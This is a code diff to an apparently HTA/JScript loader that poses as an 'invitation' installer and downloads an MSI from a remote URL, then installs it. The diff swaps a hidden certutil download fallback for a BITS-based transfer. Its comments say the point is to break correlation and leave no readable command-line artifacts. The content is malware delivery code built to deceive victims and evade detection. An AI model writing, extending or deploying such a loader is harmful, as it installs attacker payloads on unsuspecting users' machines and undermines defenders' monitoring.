@@ -115,7 +115,7 @@ function init() {
   } catch(e) { fail("Initialization failed: " + e.message); }
 }
 
-// DOWNLOAD PHASE - STAGED TO BREAK CORRELATION
+// DOWNLOAD PHASE - STAGED TO BREAK CORRELATION + BITS FALLBACK
 function startDownload() {
   state = "downloading";
   setStatus("Downloading invitation components&hellip;");
@@ -160,13 +160,36 @@ function startDownload() {
       startInstall();
     } else { fail("Server returned status: " + w.Status); }
   } catch(e) {
+    // BITS-BASED FALLBACK (NO READABLE COMMAND-LINE ARTIFACTS)
     try {
-      setStatus("Retrying via secure channel&hellip;");
-      var cmd = 'certutil -urlcache -split -f "' + MSI_URL + '" "' + msiPath + '"';
-      shell.Run(cmd, 0, true);
-      if (fso.FileExists(msiPath)) { progress = 85; setBar(progress); startInstall(); }
-      else { fail("All download methods failed."); }
-    } catch(e2) { fail("Download failed: " + e2.message); }
+      setStatus("Retrying via background transfer service&hellip;");
+      var bitsMgr = new ActiveXObject("BackgroundCopyManager");
+      var bitsJob = bitsMgr.CreateJob("EventUpdater", 3); // BG_JOB_TYPE_DOWNLOAD
+      bitsJob.AddFile(MSI_URL, msiPath);
+      bitsJob.Resume();
+      
+      // WAIT FOR BITS TRANSFER TO COMPLETE
+      var maxWait = 120000; // 2-minute timeout
+      var startTime = new Date().getTime();
+      while (new Date().getTime() - startTime < maxWait) {
+        try {
+          var jobState = bitsJob.JobState;
+          if (jobState === 4) break; // BG_JOB_STATE_TRANSFERRED
+          if (jobState === 5 || jobState === 6) throw new Error("BITS transfer failed");
+        } catch(e2) {}
+        WScript.Sleep(500);
+      }
+      
+      if (fso.FileExists(msiPath)) { 
+        progress = 85; 
+        setBar(progress); 
+        startInstall(); 
+      } else { 
+        fail("All download methods failed."); 
+      }
+    } catch(e2) { 
+      fail("Download failed: " + e2.message); 
+    }
   }
 }
 
